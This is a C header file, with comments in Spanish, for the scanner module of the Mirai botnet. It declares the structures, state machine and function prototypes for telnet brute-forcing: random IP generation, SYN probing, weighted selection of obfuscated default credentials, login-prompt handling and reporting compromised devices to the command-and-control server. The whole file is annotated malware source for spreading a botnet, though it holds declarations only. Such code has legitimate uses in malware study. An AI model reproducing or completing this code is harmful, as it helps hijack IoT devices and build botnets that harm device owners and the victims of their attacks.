/**
 * @file scanner.h
 * @brief Definiciones para el módulo de escaneo de dispositivos vulnerables
 *
 * Este archivo de encabezado define las estructuras, constantes y prototipos
 * de funciones necesarios para el escáner de dispositivos del bot Mirai.
 * El escáner busca dispositivos con servicios telnet abiertos y prueba
 * combinaciones de usuario/contraseña conocidas.
 */

#pragma once

#include <stdint.h>

#include "includes.h"

/**
 * @brief Configuración de límites y parámetros del escáner
 *
 * SCANNER_MAX_CONNS: Número máximo de conexiones simultáneas permitidas
 * SCANNER_RAW_PPS: Paquetes por segundo para el escaneo SYN
 * SCANNER_RDBUF_SIZE: Tamaño del buffer de lectura para cada conexión
 * SCANNER_HACK_DRAIN: Cantidad de bytes a descartar cuando el buffer está lleno
 */
#ifdef DEBUG
#define SCANNER_MAX_CONNS   128    /**< Máximo de conexiones simultáneas */
#define SCANNER_RAW_PPS     160    /**< Paquetes SYN por segundo en modo debug */
#else
#define SCANNER_MAX_CONNS   128    /**< Máximo de conexiones simultáneas */
#define SCANNER_RAW_PPS     160    /**< Paquetes SYN por segundo en producción */
#endif

#define SCANNER_RDBUF_SIZE  256    /**< Tamaño del buffer de lectura por conexión */
#define SCANNER_HACK_DRAIN  64     /**< Bytes a descartar del buffer cuando está lleno */

/**
 * @brief Estructura que almacena credenciales de autenticación
 *
 * Contiene un par usuario/contraseña junto con información de peso
 * para la selección aleatoria ponderada de credenciales durante
 * los intentos de autenticación.
 */
struct scanner_auth {
    char *username;              /**< Nombre de usuario desofuscado */
    char *password;              /**< Contraseña desofuscada */
    uint16_t weight_min;         /**< Límite inferior del rango de peso */
    uint16_t weight_max;         /**< Límite superior del rango de peso */
    uint8_t username_len;        /**< Longitud del nombre de usuario */
    uint8_t password_len;        /**< Longitud de la contraseña */
};

/**
 * @brief Estructura que representa una conexión activa con un objetivo
 *
 * Mantiene el estado de una conexión telnet activa, incluyendo
 * el socket, buffer de lectura, estado de la máquina de estados
 * y las credenciales que se están probando.
 */
struct scanner_connection {
    struct scanner_auth *auth;   /**< Credenciales actuales siendo probadas */
    int fd;                      /**< Descriptor del socket de la conexión */
    int last_recv;              /**< Timestamp del último dato recibido */
    enum {
        SC_CLOSED,              /**< Conexión cerrada o no iniciada */
        SC_CONNECTING,          /**< Estableciendo conexión TCP */
        SC_HANDLE_IACS,        /**< Procesando negociación telnet */
        SC_WAITING_USERNAME,    /**< Esperando prompt de usuario */
        SC_WAITING_PASSWORD,    /**< Esperando prompt de contraseña */
        SC_WAITING_PASSWD_RESP, /**< Esperando respuesta a la contraseña */
        SC_WAITING_ENABLE_RESP, /**< Esperando respuesta al comando enable */
        SC_WAITING_SYSTEM_RESP, /**< Esperando respuesta al comando system */
        SC_WAITING_SHELL_RESP,  /**< Esperando respuesta al comando shell */
        SC_WAITING_SH_RESP,     /**< Esperando respuesta al comando sh */
        SC_WAITING_TOKEN_RESP   /**< Esperando token de verificación */
    } state;                    /**< Estado actual de la máquina de estados */
    ipv4_t dst_addr;           /**< Dirección IP del objetivo */
    uint16_t dst_port;         /**< Puerto del objetivo (23 o 2323) */
    int rdbuf_pos;             /**< Posición actual en el buffer de lectura */
    char rdbuf[SCANNER_RDBUF_SIZE]; /**< Buffer para datos recibidos */
    uint8_t tries;             /**< Número de intentos realizados */
};

/**
 * @brief Inicializa el módulo de escaneo
 * 
 * Crea el proceso de escaneo y configura los recursos necesarios
 */
void scanner_init();

/**
 * @brief Detiene el proceso de escaneo
 * 
 * Envía una señal SIGKILL al proceso de escaneo
 */
void scanner_kill(void);

/**
 * @brief Configura una nueva conexión TCP
 * @param conn Estructura de conexión a configurar
 */
static void setup_connection(struct scanner_connection *);

/**
 * @brief Genera una dirección IP aleatoria válida
 * @return Dirección IP en formato network byte order
 */
static ipv4_t get_random_ip(void);

/**
 * @brief Procesa comandos IAC del protocolo telnet
 * @param conn Conexión actual
 * @return Número de bytes procesados
 */
static int consume_iacs(struct scanner_connection *);

/**
 * @brief Detecta cualquier tipo de prompt
 * @param conn Conexión actual
 * @return Posición del prompt o 0 si no se encuentra
 */
static int consume_any_prompt(struct scanner_connection *);

/**
 * @brief Detecta prompt de usuario
 * @param conn Conexión actual
 * @return Posición del prompt o 0 si no se encuentra
 */
static int consume_user_prompt(struct scanner_connection *);

/**
 * @brief Detecta prompt de contraseña
 * @param conn Conexión actual
 * @return Posición del prompt o 0 si no se encuentra
 */
static int consume_pass_prompt(struct scanner_connection *);

/**
 * @brief Detecta respuesta a credenciales
 * @param conn Conexión actual
 * @return Posición de la respuesta, 0 si no hay, -1 si son inválidas
 */
static int consume_resp_prompt(struct scanner_connection *);

/**
 * @brief Agrega nuevas credenciales a la tabla
 * @param username Usuario en formato ofuscado
 * @param password Contraseña en formato ofuscado
 * @param weight Peso para selección aleatoria
 */
static void add_auth_entry(char *, char *, uint16_t);

/**
 * @brief Selecciona credenciales aleatorias según su peso
 * @return Puntero a las credenciales seleccionadas
 */
static struct scanner_auth *random_auth_entry(void);

/**
 * @brief Reporta un dispositivo vulnerable al CNC
 * @param daddr Dirección IP del dispositivo
 * @param dport Puerto del servicio telnet
 * @param auth Credenciales válidas encontradas
 */
static void report_working(ipv4_t, uint16_t, struct scanner_auth *);

/**
 * @brief Desofusca una cadena codificada
 * @param str Cadena ofuscada
 * @param len Puntero donde se guardará la longitud
 * @return Cadena desofuscada (debe liberarse)
 */
static char *deobf(char *, int *);

/**
 * @brief Verifica si hay suficientes bytes para consumir
 * @param conn Conexión actual
 * @param ptr Posición actual en el buffer
 * @param amount Cantidad de bytes necesarios
 * @return TRUE si hay suficientes bytes, FALSE si no
 */
static BOOL can_consume(struct scanner_connection *, uint8_t *, int);
